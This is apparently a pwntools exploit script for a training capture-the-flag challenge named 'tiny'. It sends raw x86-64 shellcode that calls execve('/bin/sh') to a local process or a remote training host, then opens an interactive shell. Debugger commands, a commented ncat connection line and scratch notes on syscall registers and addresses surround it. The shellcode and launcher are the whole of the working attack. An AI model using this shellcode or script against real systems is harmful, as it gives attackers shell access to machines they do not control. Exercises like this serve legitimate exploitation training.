from pwn import *
#xor esi, esi
#xor edx, edx
#syscall
s = """

b"/bin/sh\0"
"""
COMMANDS = """
b cs_free
continue
finish
next
next
si
si
si
"""
shellcode = b"\x48\xB8\x00\x62\x69\x6E\x2F\x73\x68\x00\xB0\x2F\x50\x54\x5F\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"


#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./tiny" , gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./tiny")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500

c = """
push 0x3b
pop rax
xor esi, esi
xor edx, edx
syscall
"""